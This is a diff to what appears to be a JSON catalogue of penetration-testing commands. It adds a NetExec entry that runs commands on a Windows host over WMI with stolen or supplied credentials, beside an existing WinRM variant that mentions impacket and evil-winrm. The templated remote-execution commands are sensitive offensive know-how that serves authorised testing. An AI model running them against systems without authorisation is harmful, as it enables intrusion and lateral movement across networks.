@@ -1281,6 +1281,11 @@
         },
         {
           "tool": "nxc",
+          "run": "nxc wmi {{target}} -u {{user}} -p '{{password}}' -x '{{command}}'",
+          "note": "WMI exec fallback (DCOM/135) for when SMB (445) and WinRM (5985) are filtered but RPC is open. -X runs PowerShell instead. A Pwn3d! plus command output is the foothold."
+        },
+        {
+          "tool": "nxc",
           "run": "nxc winrm {{target}} -u {{user}} -p '{{password}}' -X '{{command}}'",
           "note": "The WinRM version, zero SMB service artifacts, output over 5985. CAVEAT: on some nxc builds `nxc winrm -x/-X` crashes with `zip() argument 2 is longer than argument 1` (seen in testing) and returns nothing; if that happens, use `nxc smb -x` (wmiexec, above), impacket-wmiexec, or evil-winrm for command exec, they were reliable on the same box."
         },
